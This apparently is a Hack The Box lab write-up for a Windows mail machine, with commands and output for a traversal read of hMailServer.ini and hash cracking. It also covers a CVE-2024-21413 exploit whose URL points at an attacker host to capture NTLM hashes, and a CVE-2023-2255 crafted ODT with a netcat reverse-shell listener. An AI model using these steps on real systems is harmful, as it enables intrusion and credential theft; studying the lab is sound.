---
title: "Windows Mail Lab — Path Traversal to Client and Document-Processor Escalation"
description: "A mail server path traversal exposes a configuration hash, and a crafted document triggers privileged code execution on a client host."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - path-traversal
  - ntlm
  - cve-2024-21413
  - cve-2023-2255
---

## Summary

This Windows mail lab runs a mail server and website vulnerable to path traversal. The traversal reads a mail-server configuration file, exposing an administrator password hash. After offline recovery, an authenticated email exploits CVE-2024-21413 against a mail client, capturing a user NetNTLMv2 hash. The hash recovers a WinRM password. Privilege escalation abuses a vulnerable document processor and CVE-2023-2255 by delivering a crafted ODT document that triggers code execution as a privileged local account.

Target IP: `<TARGET_IP>`. Credentials in this writeup are replaced with placeholders.

## Context and Objective

The target runs hMailServer with SMTP, POP3, and IMAP services alongside an IIS web server. A website exposes user names and a download endpoint. The goal is to chain web-based information disclosure into authenticated email abuse, coerce NTLM authentication to capture a user hash, and escalate privileges through a vulnerable document processor.

## Approach and Evidence

### Port Scanning

An Nmap scan reveals SMTP (25), HTTP (80), POP3 (110), IMAP (143), SMB (445), SSL/SMTP (465), Submission (587), SSL/IMAP (993), and WinRM (5985).

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/target-tcp
```

```
25/tcp   open  smtp       hMailServer smtpd
80/tcp   open  http       Microsoft IIS httpd 10.0
110/tcp  open  pop3       hMailServer pop3d
143/tcp  open  imap       hMailServer imapd
445/tcp  open  smb
465/tcp  open  ssl/smtp   hMailServer smtpd
587/tcp  open  smtp       hMailServer smtpd
993/tcp  open  ssl/imap   hMailServer imapd
5985/tcp open  winrm
```

The website identifies the mail server and lists user names. A downloadable instructions file is served through a `file=` parameter.

### Path Traversal to hMailServer Config

The download endpoint accepts file paths without adequate sanitization. Traversal sequences can reach system files outside the intended directory.

```bash
curl -s \
  'http://<TARGET_IP>/download.php?file=../../../../Program%20Files/Common%20Files/microsoft%20shared/ink/Content.xml'
```

Reading the hMailServer configuration file:

```bash
curl -s \
  'http://<TARGET_IP>/download.php?file=../../../..//Program%20Files%20(x86)/hMailServer/Bin/hMailServer.ini'
```

The configuration contains an administrator password hash:

```ini
[Security]
AdministratorPassword=<ADMIN_PASSWORD_HASH>
```

The hash is cracked offline to reveal the hMailServer administrator password:

```bash
hashcat -m 0 '<ADMIN_PASSWORD_HASH>' /usr/share/wordlists/rockyou.txt
```

```
<ADMIN_PASSWORD_HASH>:<ADMIN_PLAINTEXT_PASSWORD>
```

SMTP authentication succeeds with the cracked credentials:

```bash
swaks \
  --auth-user 'administrator@<TARGET_HOSTNAME>' \
  --auth LOGIN \
  --auth-password '<ADMIN_PLAINTEXT_PASSWORD>' \
  --quit-after AUTH \
  --server <TARGET_HOSTNAME>
```

```
<- 235 authenticated.
```

### CVE-2024-21413 — Capture a User NetNTLMv2 Hash

CVE-2024-21413 is a Microsoft Outlook vulnerability where crafted email content with a Moniker link can force SMB authentication to an operator-controlled server without user interaction. The exploit sends an authenticated email to `<TARGET_USER>@<TARGET_HOSTNAME>` containing a URL designed to trigger NTLM authentication.

```bash
python3 CVE-2024-21413.py \
  --server <TARGET_HOSTNAME> \
  --port 587 \
  --username administrator@<TARGET_HOSTNAME> \
  --password '<ADMIN_PLAINTEXT_PASSWORD>' \
  --sender administrator@<TARGET_HOSTNAME> \
   --recipient <TARGET_USER>@<TARGET_HOSTNAME> \
  --url //<ATTACKER_IP>/pwnd \
  --subject test
```

Responder captures the NTLMv2 hash:

```
<TARGET_USER>::<DOMAIN>:<NTLM_CLIENT_CHALLENGE>
```

The hash is cracked:

```bash
hashcat -m 5600 <CAPTURED_NTLMV2_FILE> /usr/share/wordlists/rockyou.txt
```

```
<TARGET_USER> : <TARGET_USER_PASSWORD>
```

WinRM authentication succeeds:

```bash
nxc winrm <TARGET_HOSTNAME> -u '<TARGET_USER>' -p '<TARGET_USER_PASSWORD>'
```

```
[+] <DOMAIN>\<TARGET_USER>:<TARGET_USER_PASSWORD> (Pwn3d!)
```

An interactive shell is obtained:

```bash
evil-winrm -i <TARGET_HOSTNAME> -u '<TARGET_USER>' -p '<TARGET_USER_PASSWORD>'
```

The user flag is available from the compromised user's desktop.

### LibreOffice CVE-2023-2255 — Privilege Escalation

Local enumeration shows LibreOffice installed:

```powershell
type "C:\Program Files\LibreOffice\program\version.ini"
```

```
MsiProductVersion=7.4.0.1
```

LibreOffice 7.4.0.1 is vulnerable to CVE-2023-2255, where crafted documents using floating frames can load external content without the expected prompt. In this environment, the document is processed by a more privileged user.

A non-executable payload pattern is prepared for the document; its download-and-execute construction is omitted.

The malicious ODT is generated:

```bash
python3 CVE-2023-2255.py \
   --cmd "<NON_EXECUTABLE_PAYLOAD_DESCRIPTION>" \
  --output malding67.odt
```

The document is delivered through the expected local workflow. The callback is caught:

```bash
nc -nlvp 9001
```

The final shell returns as `<PRIVILEGED_LOCAL_ACCOUNT>`:

```
UserName
======================
<DOMAIN>\<PRIVILEGED_LOCAL_ACCOUNT>
```

## Challenges and Decisions

The path traversal relies on URL-encoded traversal sequences and double-slash normalization quirks in the web server. The CVE-2024-21413 exploit requires valid SMTP credentials before the email can be sent. The privilege escalation depends on a privileged user or service opening the malicious ODT document.

## Outcome

This lab demonstrates a three-stage chain: web path traversal to credential extraction, NTLM coercion through an Outlook vulnerability to user-level access, and document-based privilege escalation to a privileged local account. All three stages were confirmed against the target.

## Lessons and Recommendations

- Download endpoints with a `file=` parameter should be tested for traversal early in enumeration.
- hMailServer stores sensitive administrator material in `hMailServer.ini`; cracking the hash can unlock SMTP.
- CVE-2024-21413 is useful for coercing NTLM authentication through crafted email content without user interaction.
- Document-processing software on Windows is a strong privilege escalation target when a higher-privileged user or service opens attacker-supplied files.
- Keep LibreOffice updated to address document-based code execution vulnerabilities.

## References

- Hack The Box — retired Windows mail lab — [Mailing](https://app.hackthebox.com/machines/Mailing)
- CVE-2024-21413 — Microsoft Outlook Remote Code Execution
- CVE-2023-2255 — LibreOffice Arbitrary Code Execution via Floating Frames
